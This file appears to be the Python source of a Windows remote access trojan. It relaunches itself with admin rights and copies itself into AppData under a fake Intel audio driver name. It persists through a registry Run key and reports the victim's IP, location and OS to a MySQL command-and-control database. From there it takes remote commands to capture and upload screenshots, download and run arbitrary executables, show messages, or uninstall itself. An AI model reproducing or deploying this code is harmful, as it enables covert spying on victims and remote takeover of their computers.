import mysql.connector
import random
import string
import base64
from time import sleep
from requests import get
import win32api
import json
import urllib.request
import wx
import os
from ctypes import windll
import shutil
import ctypes
import sys
import subprocess
import platform


def is_user_admin():
    try:
        return os.getuid() == 0
    except AttributeError:
        pass
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1
    except AttributeError:
        print('Requesting Admin')


def run_as_admin(argv=None, debug=False):
    shell32 = ctypes.windll.shell32
    if argv is None and shell32.IsUserAnAdmin():
        return True

    if argv is None:
        argv = sys.argv
    if hasattr(sys, '_MEIPASS'):
        arguments = map(str, argv[1:])
    else:
        arguments = map(str, argv)
    argument_line = u' '.join(arguments)
    executable = str(sys.executable)
    if debug:
        print('Command line: ', executable, argument_line)
    ret = shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
    if int(ret) <= 32:
        return False
    return None


user32 = windll.user32
user32.SetProcessDPIAware()

if not is_user_admin():
    ret = run_as_admin()
    exit()
else:
    print("All doors open...")


# should have admin privileges beyond this point

version = "0.1"
password = "Un1c0rn!Piz~a"
app_file_name = "Intel-HDSurroundSound-v9.2.3b"
app_simple_name = "IntelHD"

TBL_ID = 0
TBL_IP = 1
TBL_LOCATION = 2
TBL_LAST_SESSION_TOKEN = 3
TBL_LAST_ACTIVE = 4
TBL_PEEK = 7
TBL_THUMB = 8
TBL_ACTIVE = 9
TBL_DATE_ESTABLISHED = 5
TBL_DEL = 6
TBL_ACTION = 3
TBL_VALUE = 4

ACT_DROPLOAD = 95
ACT_DISABLE_PEEK = 96
ACT_MESSAGE = 97
ACT_ENABLE_PEEK = 98
ACT_SHUTDOWN = 99
ACT_DESTROY = 100

debug = True
cnx = None
cursor = None
peeking = False

filepath = os.path.splitext(__file__)[0] + ".exe"
savepath = os.getenv('APPDATA') + '\\Drivers'

try:
    if not os.path.exists(savepath):
        os.makedirs(savepath)
    savepath = savepath + "\\" + app_file_name + ".exe"
    shutil.copy(filepath, savepath)
except EnvironmentError as err:
    print("Error copying: " + format(err))


# startup
subprocess.call(
    r'reg.exe delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "'
    + app_simple_name + '" /f')
subprocess.call(
    r'reg.exe add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "' + app_simple_name
    + '" /t REG_SZ /f /d "%s"' % savepath)


def encode(clear):
    try:
        global password
        key = password
        enc = []
        for i in range(len(clear)):
            key_c = key[i % len(key)]
            enc_c = chr((ord(clear[i]) + ord(key_c)) % 256)
            enc.append(enc_c)
        return base64.urlsafe_b64encode("".join(enc).encode()).decode()
    except ValueError:
        error("5 - encoding error.")
        return None


def decode(enc):
    try:
        global password
        key = password
        dec = []
        enc = base64.urlsafe_b64decode(enc).decode()
        for i in range(len(enc)):
            key_c = key[i % len(key)]
            dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
            dec.append(dec_c)
        return "".join(dec)
    except ValueError:
        error("6 - decoding error.")
        return None


session_token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(32))
ip = get('https://api.ipify.org').text

with urllib.request.urlopen("http://www.freegeoip.net/json/" + ip) as url:
    locationInfo = json.loads(url.read())


print("Initialisation: ", ip, '|',  session_token)

running = True
connected = False

config = {
    'user': 'root',
    'password': '',
    'host': '127.0.0.1',
    'database': 'sql2224914',
    'port': 3306,
    'raise_on_warnings': False,
}


# --------------- UTILITY FUNCTIONS --------------- #


def log(val):
    if debug:
        print(val)


def error(num):
    print("That's a negative. " + num)


try:
    cnx = mysql.connector.connect(**config)
    cursor = cnx.cursor(buffered=True)
    connected = cnx.is_connected()
    if connected:
        print("[x] Target server established.")
        cursor.execute("SELECT * FROM tbl_users WHERE ip = '" + encode(ip) + "' LIMIT 1")
        rows = cursor.fetchall()
        if not rows:
            cursor.execute("INSERT INTO tbl_users (ip, location, last_session_token, last_active, agent, ver) VALUES ('"
                           + encode(ip) + "', '"
                           + encode(locationInfo['country_name'] + ", " + locationInfo['city']) + "', '"
                           + session_token + "', CURRENT_TIMESTAMP, '" + encode(platform.platform())
                           + "','" + version + "')")
            print('[+]', ip, "connected for the first time.")
        else:
            cursor.execute("UPDATE tbl_users SET last_active = CURRENT_TIMESTAMP, location='"
                           + encode(locationInfo['country_name'] + ", " + locationInfo['city'])
                           + "', last_session_token = '" + session_token
                           + "', del = 0, agent = '" + encode(platform.platform()) + "', ver = '"
                           + version + "' WHERE ip = '" + encode(ip) + "'")
        cnx.commit()
except mysql.connector.Error as err0:
    error("1 - " + format(err0))


# -------------- DATABASE FUNCTIONS -------------- #


def get_actions():
    global session_token
    try:
        q = ("SELECT * FROM tbl_actions"
             " WHERE (session_token = %s OR session_token = 'all') AND status = %s")
        cursor.execute(q, (session_token, 0))
        cnx.commit()
        r1 = cursor.fetchall()
        if not r1:
            # print("Waiting...", datetime.now().strftime('[%Y-%m-%d %H:%M:%S]'))
            return None
        else:
            log("[!] Action received.")
            return r1
    except mysql.connector.Error as err1:
        error("3 - " + format(err1))


def complete_action(val_id):
    try:
        q = ("UPDATE tbl_actions SET status = 1"
             " WHERE id = " + str(val_id))
        cursor.execute(q)
        cnx.commit()
    except mysql.connector.Error as err2:
        error("4 - " + format(err2))


def is_active():
    cursor.execute("UPDATE tbl_users SET last_active = CURRENT_TIMESTAMP WHERE ip = '" + encode(ip) + "'")


def save_thumb():
    app = wx.App()
    screen = wx.ScreenDC()
    size = screen.GetSize()
    bmp = wx.Bitmap(size[0], size[1])
    mem = wx.MemoryDC(bmp)
    mem.Blit(0, 0, size[0], size[1], screen, 0, 0)
    del mem
    del app
    bmp.SaveFile('thumb.dat', wx.BITMAP_TYPE_JPEG)
    with open("thumb.dat", "rb") as file:
        encode_string = base64.b64encode(file.read())
    os.remove('thumb.dat')
    cursor.execute("UPDATE tbl_users SET thumb = %(dat)s WHERE ip = '"
                   + encode(ip) + "' AND last_session_token = '" + session_token + "'",
                   {'dat': encode_string})
    cnx.commit()

# --------------- APPLICATION BLOCK -------------- #


while running:

    connected = cnx if cnx.is_connected() is not None else False
    while not connected:
        try:
            cnx = mysql.connector.connect(**config)
            cursor = cnx.cursor(buffered=True)
            connected = cnx.is_connected()
            print("[x] Target server re-established.")
            break
        except mysql.connector.Error as err:
            error("2 - " + format(err))
        sleep(60)

    actions = get_actions()
    if actions is not None:
        for a in actions:

            # SHOW WINDOWS ALERT
            if a[TBL_ACTION] == "a~" + str(ACT_MESSAGE):
                text = decode(a[TBL_VALUE]) if (decode(a[TBL_VALUE]) is not None) else ''
                if text != '':
                    win32api.MessageBox(0, decode(a[TBL_VALUE]), 'Message')

            # Peek
            elif a[TBL_ACTION] == "a~" + str(ACT_ENABLE_PEEK):
                peeking = True

            # Peek
            elif a[TBL_ACTION] == "a~" + str(ACT_DISABLE_PEEK):
                peeking = False

            # Download & Run
            elif a[TBL_ACTION] == "a~" + str(ACT_DROPLOAD):
                url = decode(a[TBL_VALUE])
                if ".exe" in url:
                    file_data = urllib.request.urlopen(decode(a[TBL_VALUE]))
                    if file_data:
                        file = open("update.exe", "wb")
                        file.write(file_data.read())
                        file.close()
                        os.startfile("update.exe")
                    else:
                        print("[!] No data downloaded.")
                else:
                    print("[!] Not an exe file.")

            # Shutdown
            elif a[TBL_ACTION] == "a~" + str(ACT_SHUTDOWN):
                print("[!] Terminated.")
                cursor.execute("UPDATE tbl_users SET last_active = NULL WHERE ip = '"
                               + encode(ip) + "' AND last_session_token = '" + session_token + "'")
                cnx.commit()
                complete_action(a[TBL_ID])
                exit()

            # Destroy
            elif a[TBL_ACTION] == "a~" + str(ACT_DESTROY):
                try:
                    subprocess.call(
                        r'reg.exe delete "HKEY_CURRENT_USER\Software\"Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "'
                        + app_simple_name + '" /f')
                except ValueError:
                    print('Startup #1')
                try:
                    subprocess.call(
                        r'reg.exe delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "'
                        + app_simple_name + '" /f')
                except ValueError:
                    print('Startup #2')
                del_file = open('del.bat', "w")
                del_file.write('@echo off\n')
                del_file.write('echo "Service un-installing..."')
                del_file.write('ping 127.0.0.1 -n 2 > nul\n')
                del_file.write('del /f "' + savepath + '"\n')
                del_file.write('exit')
                del_file.close()
                print("[!] Sorry, we must leave you now.")
                cursor.execute("UPDATE tbl_users SET del = 1 WHERE ip = '"
                               + encode(ip) + "' AND last_session_token = '" + session_token + "'")
                cnx.commit()
                complete_action(a[TBL_ID])
                print("[!] Terminated.")
                exit()

            complete_action(a[TBL_ID])

    is_active()
    if peeking:
        save_thumb()
        print('peeking')
        sleep(0.5)
    else:
        sleep(3)

if cursor is not None:
    cursor.close()
    cnx.close()
